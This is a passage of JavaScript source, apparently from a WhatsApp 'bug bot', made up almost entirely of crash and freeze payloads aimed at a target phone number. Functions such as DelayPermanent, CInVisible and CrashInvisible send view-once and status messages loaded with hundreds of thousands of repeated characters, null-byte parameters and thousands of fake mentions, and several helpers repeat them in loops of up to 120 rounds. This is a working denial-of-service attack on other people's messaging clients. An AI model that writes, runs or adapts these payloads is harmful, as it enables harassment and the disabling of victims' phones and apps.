              directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
              mimetype: "image/jpeg",
              width: 99999999999999,
              height: 99999999999999,
              fileLength: 9999999999999,
              fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
              fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
              mediaKeyTimestamp: 1753804634,
              mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          },
            body: {
              text: "shutt¿?" + "ꦽ".repeat(50000) + "ꦾ".repeat(25000) + "꧀".repeat(61111),
            },
           contextInfo: {
             participant: target,
               mentionedJid: [
                 "0@s.whatsapp.net",
                  ...Array.from({ length: 700 }, () =>
                   "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
          )
        ]
      },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
                },
                {
                  name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
                },
                {
                  name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
                }
              ],
              messageParamsJson: "{}".repeat(10000)
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: nted.generateMessageTag(),
      participant: target,
    });
  }

async function DelayPermanent(target, mention = false) {
   console.log(chalk.red("..........."));
   
   const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];
    
const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "ηтє∂ нєℓρ уσυ", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(25000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "᬴".repeat(9999),
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: [
                            {
                                name: "galaxy_message",
                                paramsJson: "\u0000".repeat(25000),
                                version: 3,
                            },
                            {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(25000),
                                version: 3,
                            }
                        ],
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
            mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                )
            ]
        }
    );
    
    const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ηтє∂ нєℓρ уσυ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(25000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });
  
  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg5 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(25000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

    for (const msg of [msg1, msg2, msg3, msg4, msg5]) {
    await nted.relayMessage(
      "status@broadcast",
      msg.message || msg,
      {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      }
    );
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "ηтє∂ нєℓρ уσυ" }, // Jangan Diubah
            content: undefined
          }
        ]
      }
    );
  }
}

async function CVisible(isTarget) {
  await nul.relayMessage(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #RizxvelzExec1St ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: isTarget },
    }
  );
}

// Invisible
async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #Rapzhers ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "#Crash/u0000",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}

async function DelayCombo(target) {
  for (let i = 0; i < 100; i++) {
    await CallUi(target)
    await PackStcBlank(target)
    await ImageUi(target)
    await Delayinvis(target, mention)
  }
};

async function FreezeHomeNew(target) {
  for (let i = 0; i < 70; i++) {
    await freezehome(target, ptcp = true)
    await FreezeClick(target)
    await Delayinvis(target, mention)
  }
};

async function DelayMakerInvisss(target) {
  for (let i = 0; i < 120; i++) {
    await DelayPermanent(target, mention = false)
    await Delayinvis(target, mention)
  }
}

async function CrashInvisible(target) {
  for (let i = 0; i < 100; i++) {
    await CInVisible(target, show = true)
  }
}

//=================================================\\
bot.launch();
startSesi();